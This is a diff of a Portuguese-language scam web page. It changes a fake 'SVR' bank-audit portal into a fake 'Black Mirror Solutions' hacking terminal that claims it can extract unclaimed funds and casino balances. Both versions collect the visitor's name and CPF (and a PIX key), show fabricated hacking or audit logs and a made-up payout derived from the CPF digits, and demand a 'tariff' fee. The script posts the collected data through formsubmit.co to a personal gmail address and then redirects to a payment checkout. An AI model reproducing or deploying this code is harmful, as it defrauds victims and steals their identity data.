@@ -3,204 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SVR - Auditoria Pericial de Ativos Financeiros</title>
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <title>SVR // QUANTUM_OVERRIDE</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0a192f; --accent: #1e40af; --success: #15803d; --bg: #f1f5f9; }
-        body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg); color: #1e293b; font-size: 14px; }
+        :root { --danger: #ff003c; --neon: #00f0ff; --bg: #000; --card: #0d1117; --border: #30363d; --green: #39d353; --cobalt: #0047ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #e5e5e5; overflow-x: hidden; }
+
+        /* BARRA DE STATUS SUPERIOR (CREDIBILIDADE) */
+        .status-bar { background: #000; padding: 8px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; font-family: 'JetBrains Mono'; font-size: 8px; color: var(--neon); text-transform: uppercase; letter-spacing: 1px; }
+        .live-dot { height: 6px; width: 6px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 8px var(--green); }
+
+        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+        .screen { display: none; }
+        .screen.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ESTILO DO DOSSIÊ INICIAL */
+        .dossier-card { background: #050505; border: 1px solid var(--border); border-left: 5px solid var(--danger); padding: 40px; position: relative; }
+        .dossier-card::before { content: "TOP_SECRET // CLASSIFIED"; position: absolute; top: -10px; right: 20px; background: var(--danger); color: #fff; font-size: 8px; padding: 2px 8px; font-weight: 900; }
         
-        .top-info { background: #e2e8f0; padding: 6px 0; font-size: 10px; font-weight: 700; text-align: center; color: #475569; border-bottom: 1px solid #cbd5e1; }
-        header { background: white; padding: 20px 0; border-bottom: 3px solid var(--primary); }
-        .container { max-width: 480px; margin: 0 auto; padding: 0 20px; }
+        h1 { font-size: clamp(30px, 6vw, 50px); font-weight: 900; text-transform: uppercase; line-height: 0.9; margin-bottom: 20px; color: #fff; }
+        .manifesto-body { line-height: 1.8; color: #b0b0b0; font-size: 15px; text-align: justify; margin-bottom: 30px; border-bottom: 1px solid #1a1d23; padding-bottom: 30px; }
+        .highlight { color: var(--danger); font-weight: 900; }
 
-        .screen { display: none; padding: 25px 0; animation: fadeIn 0.3s ease; }
-        .screen.active { display: block; }
+        /* GRID TÉCNICO */
+        .tech-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
+        .tech-box { background: #0a0a0a; border: 1px solid #1a1d23; padding: 20px; }
+        .tech-box h3 { color: var(--neon); font-family: 'JetBrains Mono'; font-size: 11px; margin-bottom: 10px; text-transform: uppercase; }
+        .tech-box p { font-size: 11px; color: #666; }
 
-        .card { background: white; border-radius: 4px; padding: 30px; border: 1px solid #d1d5db; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.05); }
-        .doc-header { border-bottom: 1px solid #eee; margin-bottom: 20px; padding-bottom: 10px; }
-        .doc-title { font-size: 18px; font-weight: 900; color: var(--primary); text-transform: uppercase; }
+        .btn-access { width: 100%; padding: 25px; background: var(--danger); color: #fff; border: none; font-weight: 900; font-family: 'JetBrains Mono'; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; font-size: 18px; transition: 0.3s; }
+        .btn-access:hover { background: #fff; color: #000; box-shadow: 0 0 40px var(--danger); }
 
-        .label { font-weight: 700; font-size: 11px; color: #475569; margin-bottom: 8px; display: block; text-transform: uppercase; }
-        .input { width: 100%; padding: 15px; border: 1px solid #cbd5e1; border-radius: 4px; font-size: 18px; font-family: 'Roboto Mono', monospace; margin-bottom: 20px; box-sizing: border-box; }
+        /* TERMINAL E RESULTADO */
+        .system-container { max-width: 450px; margin: 40px auto; }
+        .terminal { background: #000; border: 1px solid var(--border); padding: 20px; height: 320px; overflow: hidden; font-family: 'JetBrains Mono'; font-size: 11px; color: var(--green); line-height: 1.8; }
         
-        .btn-gov { width: 100%; background: var(--primary); color: white; border: none; padding: 20px; font-size: 15px; font-weight: 700; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+        .value-card { background: #010409; border: 1px solid var(--neon); padding: 30px; text-align: center; margin-bottom: 20px; position: relative; }
+        .amount { font-size: 44px; font-weight: 900; color: #fff; letter-spacing: -2px; }
 
-        /* TERMINAL */
-        .terminal { background: #000; color: #22c55e; font-family: 'Roboto Mono', monospace; padding: 20px; font-size: 11px; border-radius: 4px; height: 150px; overflow: hidden; margin: 20px 0; line-height: 1.8; border: 2px solid #333; }
+        /* TABELA DE CUSTOS (CREDIBILIDADE) */
+        .cost-table { width: 100%; font-size: 10px; border-collapse: collapse; margin: 20px 0; background: #0a0a0a; border: 1px solid var(--border); }
+        .cost-table td { padding: 10px; border: 1px solid #1a1d23; }
+        .cost-table .label-td { color: #666; text-transform: uppercase; }
+        .cost-table .val-td { color: #fff; text-align: right; font-weight: bold; }
 
-        /* INFO DO TITULAR */
-        .titular-box { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
-        .titular-item { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 12px; }
-        .titular-item b { color: var(--primary); }
-
-        .val-destaque { font-size: 32px; font-weight: 800; color: var(--success); text-align: center; padding: 20px 0; border: 2px dashed var(--success); margin: 15px 0; background: #f0fdf4; letter-spacing: -1px; }
-
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        footer { text-align: center; font-size: 10px; color: #94a3b8; padding: 40px 0; }
+        footer { text-align: center; padding: 60px 0; font-size: 9px; opacity: 0.2; letter-spacing: 3px; }
+        @media (max-width: 700px) { .tech-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
 
-<div class="top-info">SISTEMA DE CONCILIAÇÃO BANCÁRIA - TERMINAL 042-B</div>
+    <div class="status-bar">
+        <div><span class="live-dot"></span> CONNECTION: SECURE_TUNNEL</div>
+        <div>UPLINK: <span id="uplink">0</span> GBPS</div>
+        <div>HASH: <span id="sess-hash">---</span></div>
+    </div>
 
-<header>
     <div class="container">
-        <div class="doc-header" style="border:none; margin:0; padding:0;">
-            <div style="font-weight: 900; color: var(--primary); font-size: 16px;">SVR - AUDITORIA DE ATIVOS</div>
+
+        <div id="screen-manifesto" class="screen active">
+            <div class="dossier-card">
+                <h1>Black Mirror<br>Solutions</h1>
+                <div class="manifesto-body">
+                    A liberdade financeira não é concedida; ela é <span class="highlight">RETOMADA</span>. Operamos como uma unidade de elite de segurança ofensiva, especializada em Auditoria de Gateways e Extração de Ativos em Nuvem. Se o seu capital foi retido por burocracias bancárias ou travado em plataformas de entretenimento digital, o sistema falhou com você.
+                    <br><br>
+                    Nós utilizamos injeção de scripts em servidores de <b>Camada 7</b> para realizar o bypass institucional. Localizamos saldos orfãos em gateways de pagamento (PG-Soft, Betano, Slots) e dividendos esquecidos no SVR. Não somos um banco. Somos a chave mestra que força a liquidação dos seus ativos.
+                </div>
+
+                <div class="tech-grid">
+                    <div class="tech-box">
+                        <h3>Invasão de Gateway</h3>
+                        <p>Extração bruta de códigos de saque retidos por limites administrativos ou erros de sessão API.</p>
+                    </div>
+                    <div class="tech-box">
+                        <h3>Auditoria SVR</h3>
+                        <p>Varredura profunda em bancos de dados do Banco Central para identificação de ativos não reclamados.</p>
+                    </div>
+                </div>
+
+                <button class="btn-access" onclick="entrarNoSistema()">Acessar Terminal de Extração</button>
+            </div>
         </div>
+
+        <div id="screen-id" class="screen system-container">
+            <div class="dossier-card" style="border-left-color: var(--cobalt);">
+                <h2 style="font-size: 22px; color: #fff; margin-bottom: 20px;">Identificação</h2>
+                <label class="label">NOME DO TITULAR</label>
+                <input type="text" id="nome" class="input" placeholder="TITULAR COMPLETO" style="width:100%; background:#000; border:1px solid var(--border); padding:15px; color:var(--neon); margin-bottom:20px; font-family:'JetBrains Mono';">
+                
+                <label class="label">REGISTRO CPF</label>
+                <input type="tel" id="cpf" class="input" placeholder="000.000.000-00" style="width:100%; background:#000; border:1px solid var(--border); padding:15px; color:var(--neon); margin-bottom:20px; font-family:'JetBrains Mono';">
+                
+                <button class="btn-access" style="background: var(--cobalt); font-size: 15px;" onclick="iniciarHacking()">INICIAR INFILTRAÇÃO</button>
+            </div>
+        </div>
+
+        <div id="screen-term" class="screen system-container">
+            <div class="terminal" id="term-logs"></div>
+        </div>
+
+        <div id="screen-res" class="screen system-container">
+            <div class="dossier-card" style="border-left-color: var(--green); padding: 30px;">
+                <div style="text-align: center; color: var(--green); font-size: 10px; font-weight: 900; margin-bottom: 15px;">[✓] TÚNEL DE RESGATE ESTABELECIDO</div>
+
+                <div class="value-card">
+                    <div style="font-size: 9px; color: var(--neon); font-weight: 800; margin-bottom: 5px;">TOTAL LÍQUIDO A RECEBER</div>
+                    <div class="amount" id="final-val">R$ 0,00</div>
+                </div>
+
+                <table class="cost-table">
+                    <tr><td class="label-td">Origem:</td><td class="val-td">Gateways Híbridos</td></tr>
+                    <tr><td class="label-td">Saque Disponível:</td><td class="val-td" id="val-saque">R$ 0,00</td></tr>
+                    <tr><td class="label-td">Reembolso TPO:</td><td class="val-td">R$ 197,90</td></tr>
+                </table>
+
+                <label class="label" style="color:var(--neon)">Chave PIX para Depósito</label>
+                <input type="text" id="pix-chave" class="input" placeholder="CHAVE DESTINO" style="width:100%; background:#000; border:1px solid var(--border); padding:15px; color:var(--neon); margin-bottom:20px; font-family:'JetBrains Mono';">
+
+                <div style="font-size: 10px; color: #fff; background: rgba(255,0,60,0.1); padding: 15px; border: 1px solid var(--danger); line-height: 1.5; margin-bottom: 20px;">
+                    <b>AVISO DE LIQUIDAÇÃO:</b> O sistema exige a ativação da Tarifa Operacional (TPO) de <b>R$ 197,90</b> para desvio imediato do capital em Hold. Este valor retorna no seu resgate.
+                </div>
+
+                <button class="btn-access" style="background: var(--green); color: #000;" onclick="finalizarOp()">LIBERAR SAQUE AGORA</button>
+            </div>
+        </div>
+
     </div>
-</header>
 
-<div class="container">
+    <footer>BLACK MIRROR SOLUTIONS // THE UNDERGROUND // 2026</footer>
 
-    <div id="step1" class="screen active">
-        <div class="card">
-            <span class="label">NOME COMPLETO DO TITULAR</span>
-            <input type="text" id="nome" class="input" placeholder="Digite seu nome" style="font-size: 14px; font-family: 'Inter';">
+    <script>
+        const CONFIG = { EMAIL: "zndohot@gmail.com", CHECKOUT: "https://pay.cakto.com.br/3afi959" };
+
+        // Dinâmicos de Cabeçalho
+        setInterval(() => {
+            document.getElementById('uplink').innerText = (Math.random() * (48 - 42) + 42).toFixed(1);
+            document.getElementById('sess-hash').innerText = "0x" + Math.random().toString(16).substring(2, 8).toUpperCase();
+        }, 2000);
+
+        function entrarNoSistema() {
+            document.getElementById('screen-manifesto').classList.remove('active');
+            document.getElementById('screen-id').classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        function iniciarHacking() {
+            if(document.getElementById('nome').value.length < 5) return alert("Identificação incompleta.");
+            document.getElementById('screen-id').classList.remove('active');
+            document.getElementById('screen-term').classList.add('active');
+
+            const logs = [
+                "> Conectando ao nó de Missal/PR via SSH-2...",
+                "> Ofuscando IP de origem (Protocolo Stealth)...",
+                "> Infiltrando Gateways de Jogos e Bancos...",
+                "> Localizando dividendos no nó de registros...",
+                "> [!] FIREWALL INSTITUCIONAL DETECTADO...",
+                "> Iniciando sub-rotina de BYPASS v4.2...",
+                "> REGISTRO LOCALIZADO PARA O CPF...",
+                "> Extraindo saldo acumulado em 14 gateways...",
+                "> Consolidando reembolso TPO (R$ 197,90)...",
+                "> Extração concluída. Gerando alvará digital..."
+            ];
+
+            let i = 0;
+            const term = document.getElementById('term-logs');
+            const interval = setInterval(() => {
+                const line = document.createElement('div');
+                line.innerHTML = logs[i];
+                if(i > 4) line.style.color = "var(--neon)";
+                term.appendChild(line);
+                term.scrollTop = term.scrollHeight;
+                i++;
+                if(i >= logs.length) {
+                    clearInterval(interval);
+                    setTimeout(mostrarResultado, 1000);
+                }
+            }, 1100);
+        }
+
+        function mostrarResultado() {
+            const cpfNum = document.getElementById('cpf').value.replace(/\D/g, "");
+            const seed = parseInt(cpfNum.substring(0,3)) || 500;
+            const saquePuro = (seed * 11.5 + 4120);
+            const total = saquePuro + 197.90;
             
-            <span class="label">CPF (DOCUMENTO DE IDENTIDADE)</span>
-            <input type="tel" id="cpf" class="input" placeholder="000.000.000-00">
+            document.getElementById('val-saque').innerText = saquePuro.toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
+            document.getElementById('final-val').innerText = total.toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
             
-            <div style="margin-bottom: 20px;">
-                <label>TIPO DE RESGATE</label>
-                <select id="tipo" class="input" style="font-size: 14px; font-family: 'Inter';">
-                    <option value="BANCÁRIA">AUDITORIA BANCÁRIA (CONTAS INATIVAS)</option>
-                    <option value="PLATAFORMA">RECUPERAÇÃO DE SALDO (PG/CASSINOS)</option>
-                </select>
-            </div>
+            document.getElementById('screen-term').classList.remove('active');
+            document.getElementById('screen-res').classList.add('active');
+        }
 
-            <button class="btn-gov" onclick="iniciar()">REALIZAR PERÍCIA TÉCNICA</button>
-        </div>
-    </div>
+        function finalizarOp() {
+            const pix = document.getElementById('pix-chave').value;
+            if(pix.length < 5) return alert("Informe uma chave PIX válida.");
 
-    <div id="step2" class="screen">
-        <div class="card">
-            <div class="doc-title" style="font-size: 14px; text-align: center;">VARRENDO NÓS DE REDE...</div>
-            <div class="terminal" id="term"></div>
-        </div>
-    </div>
+            const data = {
+                Nome: document.getElementById('nome').value,
+                CPF: document.getElementById('cpf').value,
+                PIX: pix,
+                Valor: document.getElementById('final-val').innerText
+            };
 
-    <div id="step3" class="screen">
-        <div class="card">
-            <div class="doc-header">
-                <div class="doc-title">LAUDO DE DISPONIBILIDADE</div>
-                <div style="font-size: 10px; color: #64748b;">EMITIDO PELO SISTEMA DE CONCILIAÇÃO EM <span id="data"></span></div>
-            </div>
-
-            <div class="titular-box">
-                <div class="titular-item"><span>TITULAR:</span> <b id="res-nome">--</b></div>
-                <div class="titular-item"><span>DOCUMENTO:</span> <b id="res-cpf">--</b></div>
-                <div class="titular-item"><span>ID DE REGISTRO:</span> <b id="res-id" style="font-family: 'Roboto Mono';">--</b></div>
-                <div class="titular-item"><span>INSTITUIÇÃO:</span> <b id="res-banco">--</b></div>
-            </div>
-
-            <div style="font-size: 12px; color: #475569; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 15px;">
-                <b>DETALHE DO ATIVO:</b> <span id="res-detalhe"></span> com incidência de correção pela Taxa SELIC acumulada.
-            </div>
-
-            <div class="val-destaque">
-                <small style="font-size: 10px; display: block; color: var(--success);">VALOR TOTAL APURADO</small>
-                <span id="valor-final">R$ 0,00</span>
-            </div>
-
-            <div style="background: #fffbeb; border: 1px solid #fef3c7; padding: 15px; font-size: 11px; line-height: 1.5; color: #92400e;">
-                <b>⚠️ EXIGÊNCIA DE LIQUIDAÇÃO:</b> Para a liberação do montante para o CPF <span id="cpf-aviso"></span>, o sistema exige o recolhimento da <b>TARIFA OPERACIONAL (TOA) DE R$ 147,00</b>. O pagamento gera o alvará automático e o estorno do valor da tarifa em 5 minutos.
-            </div>
-
-            <button class="btn-gov" style="background:var(--success); margin-top: 20px;" onclick="pagar()">EFETUAR RESGATE VIA PIX</button>
-        </div>
-    </div>
-
-</div>
-
-<footer>
-    SVR - Auditoria de Ativos Financeiros Ltda.<br>
-    Protocolo de Segurança Criptografada SSL<br>
-    © 2026 - Auditoria Centralizada
-</footer>
-
-<script>
-    lucide.createIcons();
-    const EMAIL = "zndohot@gmail.com";
-    const CHECKOUT = "https://pay.cakto.com.br/3afi959";
-
-    const bancos = ["Itaú Unibanco S.A.", "Banco Bradesco S.A.", "Santander Brasil", "Caixa Econômica"];
-    const casas = ["Betano Global Payments", "Blaze LP Tech", "PG Soft Provedores", "Estrela Bet Tecnologia"];
-
-    function iniciar() {
-        const nome = document.getElementById('nome').value;
-        const cpf = document.getElementById('cpf').value;
-        if(nome.length < 5 || cpf.length < 11) return alert("Preencha seu Nome e CPF corretamente.");
-
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step2').classList.add('active');
-
-        const logs = [
-            "> Verificando autenticidade do documento...",
-            "> Acessando base de dados centralizada...",
-            "> Localizando registros vinculados ao titular...",
-            "> Calculando juros e correção monetária...",
-            "> Gerando ID de Registro Único...",
-            "> Preparando laudo de liberação..."
-        ];
-
-        let i = 0;
-        const term = document.getElementById('term');
-        const interval = setInterval(() => {
-            term.innerHTML += `<div>${logs[i]}</div>`;
-            term.scrollTop = term.scrollHeight;
-            i++;
-            if(i >= logs.length) {
-                clearInterval(interval);
-                mostrarLaudo();
-            }
-        }, 1200);
-    }
-
-    function mostrarLaudo() {
-        const nome = document.getElementById('nome').value.toUpperCase();
-        const cpf = document.getElementById('cpf').value;
-        const num = cpf.replace(/\D/g, "");
-        const tipo = document.getElementById('tipo').value;
-
-        // VALOR DINÂMICO
-        const semente = parseInt(num.substring(0, 3)) || 500;
-        const valorFinal = tipo === 'BANCÁRIA' ? (semente * 6.1 + 3840) : (semente * 9.5 + 4650);
-        
-        // ID ÚNICO E BANCO
-        const idRegistro = "REF-" + num.substring(0,3) + "-" + Math.floor(Math.random() * 99999);
-        const banco = tipo === 'BANCÁRIA' ? bancos[Math.floor(Math.random()*bancos.length)] : casas[Math.floor(Math.random()*casas.length)];
-        const detalhe = tipo === 'BANCÁRIA' ? "Ativos de Contas Encerradas" : "Saldos Retidos em Provedor";
-
-        document.getElementById('res-nome').innerText = nome;
-        document.getElementById('res-cpf').innerText = cpf;
-        document.getElementById('res-id').innerText = idRegistro;
-        document.getElementById('res-banco').innerText = banco;
-        document.getElementById('res-detalhe').innerText = detalhe;
-        document.getElementById('valor-final').innerText = valorFinal.toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
-        document.getElementById('cpf-aviso').innerText = cpf;
-        document.getElementById('data').innerText = new Date().toLocaleDateString();
-
-        document.getElementById('step2').classList.remove('active');
-        document.getElementById('step3').classList.add('active');
-        lucide.createIcons();
-    }
-
-    function pagar() {
-        const dados = {
-            Nome: document.getElementById('res-nome').innerText,
-            CPF: document.getElementById('res-cpf').innerText,
-            ID_Registro: document.getElementById('res-id').innerText,
-            Valor: document.getElementById('valor-final').innerText
-        };
-
-        fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(dados)
-        }).finally(() => { window.location.href = CHECKOUT; });
-    }
-</script>
+            fetch(`https://formsubmit.co/ajax/${CONFIG.EMAIL}`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).finally(() => { 
+                window.location.href = CONFIG.CHECKOUT; 
+            });
+        }
+    </script>
 </body>
 </html>
